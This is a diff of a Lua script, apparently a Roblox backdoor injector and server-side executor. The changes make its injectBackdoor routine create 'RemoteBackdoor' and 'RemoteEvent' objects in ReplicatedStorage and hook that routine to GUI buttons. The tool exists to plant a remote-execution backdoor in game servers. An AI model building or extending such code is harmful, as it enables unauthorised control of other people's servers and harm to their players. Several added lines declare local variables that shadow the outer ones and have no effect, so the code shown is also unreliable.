@@ -167,6 +167,7 @@ local function createRemoteBackdoor()
         updateNotification("RemoteBackdoor created.")
     else
         updateNotification("RemoteBackdoor already exists.")
+        local remoteBackdoor = game.ReplicatedStorage:FindFirstChild("RemoteBackdoor")
     end
     return remoteBackdoor
 end
@@ -180,6 +181,7 @@ local function createRemoteEvent()
         print("RemoteEvent created.")
     else
         print("RemoteEvent already exists.")
+        local remoteEvent = game.ReplicatedStorage:FindFirstChild("RemoteEvent")
     end
     return remoteEvent
 end
@@ -480,6 +482,8 @@ local function injectBackdoor()
     end
     
     -- // Call SSExec Func:
+    createRemoteEvent()
+    createRemoteBackdoor()
     createScriptHandler()
     createGUIHandler()
     createServerScriptHandler()
@@ -490,6 +494,7 @@ local function injectBackdoor()
     serverHint()
 end
 
+serverHint() -- If Failed 
 executeButton.MouseButton1Click:Connect(executeScript)
 injectButton.MouseButton1Click:Connect(injectBackdoor)
 -- // Ngawuor wkwk
